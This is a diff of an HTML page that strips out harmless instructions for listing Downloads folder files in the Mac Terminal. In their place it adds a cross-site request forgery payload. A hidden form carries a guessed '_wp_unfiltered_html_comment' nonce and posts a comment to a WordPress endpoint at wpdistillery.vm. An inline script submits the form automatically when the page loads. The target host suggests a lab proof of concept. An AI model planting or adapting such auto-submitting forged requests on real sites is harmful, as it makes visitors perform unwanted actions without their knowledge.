@@ -3,30 +3,15 @@
     <link rel="stylesheet" type="text/css" href="./main.css">
   </head>
   <body>
-    <h1>Instruction for getting a list of the files in your downloads </h1>
-	<p>
-		<ul>
-	 		<li>In your finder, go up to the <b>Go</b> menu and open <b>Utilities</b> (or press shift-command-u).</li>
-	  		<li>Open the <b>Terminal</b> application.</li>
-		</ul>
-    </p>
-    <img src="./inst1.gif" />
-     
-    <hr/>
-    <p>
-	    <ul>
-	      <li>In the terminal, type <b>cd downloads</b> (this will take you to the downloads directory)</li>
-	      <li>Type <b>touch panda.txt</b> (this will create a file to save your list to)</li>
-	      <li>Type <b>ls > panda.txt</b> (note "l" as in lower-case "L"), this will fill your panda.txt file with the list</li>
-	    </ul>
-    </p>
-    <img src="./inst2.gif" />
-    <br/>
-    <p>
-    	You can now close the terminal, go to your downloads folder, and find the panda.txt.
-    </p>
+    <form name="inject" action="http://wpdistillery.vm/wp-comments-post.php" method="POST">
+	<input type="hidden" name="comment" value="What has happened here?!">
+	<input type="hidden" name="comment_post_ID" value="1">
+	<input type="hidden" name="comment_parent" value="0">
+	<input type="hidden" name="_wp_unfiltered_html_comment" value="1234121234">
+	<input type="submit" value="Post">
     
-    
+	</form>
+	  <script>document.inject.submit(); </script>
   </body>
   
 </html>
